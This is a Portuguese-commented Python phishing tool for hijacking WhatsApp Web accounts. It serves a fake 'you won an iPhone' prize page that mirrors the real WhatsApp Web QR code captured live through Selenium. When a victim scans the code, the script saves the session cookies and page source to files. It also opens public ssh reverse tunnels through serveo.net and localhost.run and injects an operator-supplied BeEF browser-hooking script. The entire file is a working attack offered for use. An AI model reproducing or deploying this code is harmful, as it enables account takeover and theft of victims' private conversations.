# Author: https://github.com/zr0n
# modded by https://github.com/wrxxnch
# Modified for Session Dumping & Synchronized QR Mirroring

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import base64
import os
import http.server
import socketserver
import threading
import subprocess
import time
import random
import socket
import psutil
import signal
import json
import webbrowser

# Configurações
PHISHING_PORT = random.randint(8000, 9000)
BEEF_HOOK = ""

# Função para obter o IP local da máquina na rede automaticamente
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

LOCAL_IP = get_local_ip()

# HTML principal da página de phishing
PHISHING_HTML = """
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Parabéns! Você foi sorteado!</title>
    <style>
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #25D366 0%, #128C7E 100%); margin: 0; padding: 20px; color: white; text-align: center; }
        .container { max-width: 500px; margin: 30px auto; background: white; padding: 30px; border-radius: 15px; color: #333; box-shadow: 0 15px 35px rgba(0,0,0,0.3); }
        .whatsapp-logo { width: 80px; height: 80px; background: #25D366; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 40px; }
        h1 { color: #128C7E; font-size: 28px; margin-bottom: 15px; }
        .qr-container { margin: 25px auto; padding: 20px; background: #f9f9f9; border-radius: 10px; border: 2px dashed #25D366; display: flex; flex-direction: column; align-items: center; }
        .qr-code { max-width: 300px; margin: 0 auto; }
        .qr-code img { width: 228px; height: 228px; border: 1px solid #ddd; border-radius: 5px; }
        .instructions { background: #E8F5E9; padding: 15px; border-radius: 8px; margin: 20px 0; text-align: left; }
        .prize { font-size: 22px; color: #E91E63; font-weight: bold; margin: 20px 0; padding: 15px; background: #FFF3E0; border-radius: 8px; border: 2px solid #FF9800; }
        .timer { font-size: 16px; color: #D32F2F; font-weight: bold; margin: 15px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="whatsapp-logo">📱</div>
        <h1>🎉 PARABÉNS! VOCÊ FOI SORTEADO! 🎉</h1>
        <div class="prize">🏆 PRÊMIO: iPhone 15 Pro Max + R$ 5.000 🏆</div>
        <p>Para validar e resgatar seu prêmio, <strong>faça login no WhatsApp Web</strong> escaneando o QR Code abaixo:</p>

        <div class="qr-container">
            <div data-testid="link-device-qr-code" style="text-align: center;">
                <div class="qr-code">
                    <img src="/qr.png?t=REPLACE_TIMESTAMP" alt="QR Code" id="qrImage">
                </div>
            </div>
        </div>

        <div class="timer">⏳ TEMPO RESTANTE: <span id="countdown">05:00</span></div>
        <div class="instructions">
            <h3>📋 Como resgatar seu prêmio:</h3>
            <ol>
                <li>Abra o WhatsApp no seu celular</li>
                <li>Toque em <strong>Menu → WhatsApp Web</strong></li>
                <li>Aponte a câmera para o QR Code acima</li>
                <li>Seu prêmio será liberado automaticamente após o login!</li>
            </ol>
        </div>
        <p><strong>⚠️ ATENÇÃO:</strong> Você tem apenas 5 minutos para escanear o QR code!</p>
    </div>

    REPLACE_BEEF_HOOK

    <script>
        function updateQRCode() {
            const img = document.getElementById('qrImage');
            img.src = '/qr.png?t=' + new Date().getTime();
            setTimeout(updateQRCode, 1000);
        }
        function startCountdown() {
            let timeLeft = 5 * 60;
            const countdownElement = document.getElementById('countdown');
            const timer = setInterval(() => {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    countdownElement.textContent = "TEMPO ESGOTADO!";
                    countdownElement.style.color = "#D32F2F";
                }
                timeLeft--;
            }, 1000);
        }
        updateQRCode();
        startCountdown();
    </script>
</body>
</html>
"""

# HTML isolado contendo APENAS o QR Code para embed
QR_ONLY_HTML = """
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <style>
        body { margin: 0; background: transparent; display: flex; justify-content: center; align-items: center; height: 100vh; }
        img { width: 228px; height: 228px; border: 1px solid #ddd; border-radius: 5px; background: white; padding: 5px; }
    </style>
</head>
<body>
    <img src="/qr.png?t=REPLACE_TIMESTAMP" alt="QR Code" id="qrImage">
    <script>
        function updateQRCode() {
            const img = document.getElementById('qrImage');
            img.src = '/qr.png?t=' + new Date().getTime();
            setTimeout(updateQRCode, 1000);
        }
        updateQRCode();
    </script>
</body>
</html>
"""

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html_final = PHISHING_HTML.replace("REPLACE_TIMESTAMP", str(int(time.time())))
            html_final = html_final.replace("REPLACE_BEEF_HOOK", BEEF_HOOK)
            self.wfile.write(html_final.encode())
        elif self.path == '/qr_embed':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html_final = QR_ONLY_HTML.replace("REPLACE_TIMESTAMP", str(int(time.time())))
            self.wfile.write(html_final.encode())
        elif self.path.startswith('/qr.png'):
            try:
                self.send_response(200)
                self.send_header('Content-type', 'image/png')
                self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
                self.end_headers()
                with open('qr.png', 'rb') as f:
                    self.wfile.write(f.read())
            except FileNotFoundError:
                self.send_response(404)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        pass

def kill_process_on_port(port):
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                for conn in proc.connections():
                    if conn.laddr.port == port:
                        os.kill(proc.pid, signal.SIGTERM)
            except (psutil.NoSuchProcess, psutil.AccessDenied): pass
    except: pass

def start_phishing_server():
    global PHISHING_PORT
    try:
        kill_process_on_port(PHISHING_PORT)
        with socketserver.TCPServer(("", PHISHING_PORT), PhishingHandler) as httpd:
            print(f"✅ Servidor phishing rodando na porta {PHISHING_PORT}")
            httpd.serve_forever()
    except Exception as e:
        print(f"❌ Erro servidor: {e}")

def setup_simple_tunnel(tunnel_callback):
    strategies = [
        {'name': 'Serveo.net', 'command': ['ssh', '-o', 'StrictHostKeyChecking=no', '-R', '80:localhost:' + str(PHISHING_PORT), 'serveo.net']},
        {'name': 'Localhost.run', 'command': ['ssh', '-o', 'StrictHostKeyChecking=no', '-R', '80:localhost:' + str(PHISHING_PORT), 'nokey@localhost.run']}
    ]
    for strategy in strategies:
        try:
            process = subprocess.Popen(strategy['command'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            for _ in range(10):
                line = process.stdout.readline()
                if 'https://' in line:
                    import re
                    match = re.search(r'https://[a-zA-Z0-9.-]+\.(?:serveo\.net|lhr\.life|lhr\.run)', line)
                    if match:
                        tunnel_callback(match.group(0), process)
                        return
            process.terminate()
        except: pass
    tunnel_callback(None, None)

def start_whatsapp_hijacking():
    print("\n📱 [MONITORAMENTO] Iniciando sincronização em tempo real...")
    try:
        from selenium.webdriver.firefox.options import Options
        options = Options()
        # options.add_argument("--headless") # Descomente se quiser ocultar o navegador do Selenium
        browser = webdriver.Firefox(options=options)
        
        browser.get("https://web.whatsapp.com/")

        print("⏳ Aguardando renderização do QR Code oficial...")
        WebDriverWait(browser, 30).until(EC.presence_of_element_located((By.CSS_SELECTOR, "canvas")))

        def fast_qr_sync():
            while True:
                try:
                    canvas = browser.find_element(By.CSS_SELECTOR, "canvas")
                    data_url = browser.execute_script("return arguments[0].toDataURL('image/png');", canvas)
                    with open("qr.png", "wb") as f:
                        f.write(base64.b64decode(data_url.replace("data:image/png;base64,", "")))
                except:
                    pass
                time.sleep(0.5)

        sync_thread = threading.Thread(target=fast_qr_sync, daemon=True)
        sync_thread.start()

        print("🎯 QR Code perfeitamente sincronizado!")
        print("🎯 Aguardando leitura...")

        while True:
            try:
                browser.find_element(By.CSS_SELECTOR, "canvas")
                time.sleep(1)
            except NoSuchElementException:
                print("\n" + "="*60)
                print("🚨 [ALERTA] QR CODE ESCANEADO COM SUCESSO! 🎯")
                print("="*60)

                session_id = int(time.time())
                cookies = browser.get_cookies()
                formatted_cookies = []
                
                for cookie in cookies:
                    formatted_cookie = {
                        "domain": cookie.get("domain"),
                        "expirationDate": cookie.get("expiry"),
                        "hostOnly": cookie.get("domain", "").startswith(".") is False,
                        "httpOnly": cookie.get("httpOnly", False),
                        "name": cookie.get("name"),
                        "path": cookie.get("path", "/"),
                        "sameSite": cookie.get("sameSite"),
                        "secure": cookie.get("secure", False),
                        "session": cookie.get("expiry") is None,
                        "storeId": None,
                        "value": cookie.get("value")
                    }
                    formatted_cookies.append(formatted_cookie)

                with open(f"cookies_sessao_{session_id}.json", "w", encoding="utf-8") as f:
                    json.dump(formatted_cookies, f, indent=4)

                with open(f"index_sessao_{session_id}.html", "w", encoding="utf-8") as f:
                    f.write(browser.page_source)

                print(f"✅ Sessão salva: cookies_sessao_{session_id}.json e index_sessao_{session_id}.html")
                break

        return browser
    except Exception as e:
        print(f"❌ Erro na captura: {e}")
        return None

def main():
    global BEEF_HOOK
    print("🚀 SISTEMA DE CAPTURA CONTÍNUA WHATSAPP + BEEF")
    BEEF_HOOK = input("\n💉 Insira o script hook do BeEF: ")

    # Inicia servidor web em background (thread daemon)
    server_thread = threading.Thread(target=start_phishing_server, daemon=True)
    server_thread.start()
    time.sleep(1)

    local_url = f"http://localhost:{PHISHING_PORT}"
    network_url = f"http://{LOCAL_IP}:{PHISHING_PORT}"
    embed_url = f"{network_url}/qr_embed"

    print(f"\n🏠 URL Local: {local_url}")
    print(f"🌍 URL da Rede Local (IP): {network_url}")
    
    # Exibe código IFRAME pronto apenas com o QR Code
    print("\n" + "="*60)
    print("📋 CÓDIGO IFRAME APENAS DO QR CODE PARA SEU HTML:")
    print("="*60)
    print(f'<iframe src="{embed_url}" width="260" height="260" style="border:none;background:transparent;" scrolling="no"></iframe>')
    print("="*60 + "\n")

    # Abre a URL automaticamente no navegador padrão
    webbrowser.open(local_url)

    def handle_tunnel(url, proc):
        if url:
            print(f"🌐 URL Pública: {url}")
        else:
            print("⚠️ Não foi possível abrir o túnel público (continuando apenas local).")

    tunnel_thread = threading.Thread(target=setup_simple_tunnel, args=(handle_tunnel,), daemon=True)
    tunnel_thread.start()

    # Inicia a captura imediatamente sem bloqueios
    browser = start_whatsapp_hijacking()

    print("\n" + "="*60)
    print("✅ PROCESSO CONCLUÍDO!")
    print("Sessões capturadas estão na pasta atual.")
    print("="*60)

    try:
        while True: time.sleep(10)
    except KeyboardInterrupt:
        if browser: browser.quit()
        kill_process_on_port(PHISHING_PORT)

if __name__ == "__main__":
    main()
